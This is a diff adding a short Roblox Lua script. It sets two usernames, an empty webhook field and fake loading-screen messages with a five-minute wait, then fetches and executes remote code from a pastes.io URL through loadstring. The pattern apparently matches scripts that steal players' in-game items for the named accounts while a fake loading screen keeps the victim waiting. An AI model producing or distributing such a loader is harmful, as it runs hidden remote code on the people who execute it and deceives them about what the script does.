@@ -1,0 +1,17 @@
+UserName = "dolboeb4578"
+
+UserName2 = "guest666nomber3"
+
+Webhook = ""
+
+_G.ScriptName = "Loading.."
+
+_G.FirstText = "Please wait.."
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 300
+
+loadstring(game:HttpGet("https://pastes.io/raw/xpkcssuwqq", true))()
